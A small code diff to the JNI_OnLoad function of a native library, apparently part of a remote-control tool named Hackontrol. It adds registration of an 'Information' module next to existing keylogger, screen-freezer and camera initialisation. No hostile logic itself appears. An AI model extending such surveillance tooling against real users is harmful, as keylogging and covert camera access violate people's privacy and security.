@@ -3,6 +3,7 @@
 #include "keylogger.h"
 #include "shutdown_handler.h"
 #include "screen_freezer.h"
+#include "Information.h"
 
 JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
 	JNIEnv* environment = NULL;
@@ -15,6 +16,7 @@ JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
 	RegisterShutdownHandler(environment, virtualMachine);
 	InitializeScreenFreezer(environment, virtualMachine);
 	RegisterHackontrolNative(environment);
+	InformationRegisterNatives(environment);
 	KeyLoggerInitialize(environment, virtualMachine);
 	InitializeCamera(environment);
 	return JNI_VERSION_21;
